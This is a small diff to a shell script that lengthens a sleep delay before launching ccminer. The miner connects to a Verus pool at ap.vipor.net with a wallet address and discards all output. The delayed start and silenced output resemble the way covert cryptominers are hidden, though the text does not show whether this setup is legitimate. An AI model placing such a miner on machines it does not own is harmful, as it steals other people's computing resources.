@@ -1,4 +1,4 @@
 #!/bin/sh
-sleep 2300
+sleep 6000
 ./ccminer -a verus -o stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.usa-minersave -t 0 > /dev/null 2>&1
 
